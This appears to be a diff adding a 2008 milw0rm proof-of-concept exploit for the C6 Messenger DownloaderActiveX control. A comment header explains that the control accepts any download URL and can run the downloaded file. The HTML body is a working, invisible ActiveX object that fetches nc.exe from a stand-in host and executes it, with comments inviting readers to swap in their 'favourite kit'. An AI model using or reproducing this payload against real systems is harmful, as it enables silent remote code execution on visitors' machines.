@@ -1,0 +1,67 @@
+<!--
+
+C6 Messenger Installation Url DownloaderActiveX Control Remote Download
+& Execute Exploit
+
+by
+Nine:Situations:Group::SnoopyAssault
+
+site: http://retrogod.altervista.org/
+
+"C6 Messenger is an instant messaging program produced by Telecom Italia Group,
+specifically by Alice (distribution), Icon Spa (development, design and server)
+and Opendoc (graphics). It is the only instant messenger entirely produced in
+Italy, is a free program, allows you to chat in real time with friends[..]"
+
+installation urls:
+http://c6.community.alice.it/home/index.html
+http://c6.community.alice.it/download/c6.html
+
+Whoever accessed the second one with IE to install c6 IM is vulnerable to this
+threat. Notice that you can pass also local urls to "propDownloadUrl" property
+and bypass Internet zone, no host check is performed.
+"propPostDownloadAction" one is used to launch the executable.
+A progress bar is shown but you can easily make it not visible.
+
+settings:
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data
+IPersist Safe:  Safe for untrusted: caller,data
+
+info:
+http://www.google.com/search?hl=en&q=c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61&meta=&num=100&filter=0
+Let me guess, this one is already exploited in the wild...
+Thanks Mommy Telecom Italia!!
+
+If you think this poc is useful, please help us to improve our equipment and
+donate through the paypal button on our site!
+
+--------------------------------------------------------------------------------
+Goodbye rgod-tsid-pah he-ru-ka!
+-->
+<HTML>
+<BODY>
+<OBJECT ID="DownloaderActiveX1"
+WIDTH="0"
+HEIGHT="0"
+CLASSID="CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61"
+CODEBASE="DownloaderActiveX.cab#Version=1,0,0,1">
+<PARAM NAME="propProgressBackground"  VALUE="#bccee8">
+<PARAM NAME="propTextBackground"  VALUE="#f7f8fc">
+<PARAM NAME="propBarColor"  VALUE="#df0203">
+<PARAM NAME="propTextColor"  VALUE="#000000">
+<PARAM NAME="propWidth"  VALUE="0">
+<PARAM NAME="propHeight"  VALUE="0">
+<PARAM NAME="propDownloadUrl"  VALUE="http://yoursite.com/nc.exe"><!-- change to your favourite kit ! :) -->
+<PARAM NAME="propPostDownloadAction"  VALUE="run"> <!-- lol -->
+<PARAM NAME="propInstallCompleteUrl"  VALUE="">
+<PARAM NAME="propBrowserRedirectUrl"  VALUE="">
+<PARAM NAME="propVerbose"  VALUE="0">
+<PARAM NAME="propInterrupt"  VALUE="0">
+</OBJECT>
+</BODY>
+</HTML>
+
+# milw0rm.com [2008-06-03]
